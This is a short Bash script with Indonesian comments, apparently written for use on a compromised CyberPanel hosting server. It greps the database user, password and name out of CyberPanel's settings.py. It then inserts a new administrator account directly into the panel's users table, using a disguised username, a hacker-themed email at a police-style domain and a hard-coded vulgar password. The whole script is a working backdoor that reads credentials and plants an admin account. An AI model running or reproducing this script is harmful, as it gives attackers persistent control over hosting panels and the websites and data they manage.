#!/bin/bash

# Lokasi file konfigurasi CyberPanel
CONFIG_FILE="/usr/local/CyberCP/CyberCP/settings.py"

# Ambil informasi database dari file konfigurasi
DB_USER=$(grep -oP "(?<='USER': ')[^']+" $CONFIG_FILE)
DB_PASSWORD=$(grep -oP "(?<='PASSWORD': ')[^']+" $CONFIG_FILE)
DB_NAME=$(grep -oP "(?<='NAME': ')[^']+" $CONFIG_FILE)

# Verifikasi apakah informasi ditemukan
if [[ -z "$DB_USER" || -z "$DB_PASSWORD" || -z "$DB_NAME" ]]; then
    echo "Gagal menemukan informasi database di file konfigurasi."
    exit 1
fi

# Informasi pengguna baru
first_name="Herman"
last_name="Budaya"
username="AdminSystemss"
email="batosay.haxor@polri.go.id"
password="Kontol@12k"

# Hash password dengan SHA256
hashed_password=$(echo -n "$password" | sha256sum | awk '{print $1}')

# Buat user baru dengan akses admin
mysql -u"$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -e "
INSERT INTO users (first_name, last_name, username, email, password, account_type)
VALUES ('$first_name', '$last_name', '$username', '$email', '$hashed_password', 'admin');
"

if [ $? -eq 0 ]; then
    echo "Pengguna admin $username berhasil dibuat."
else
    echo "Gagal membuat pengguna admin."
fi
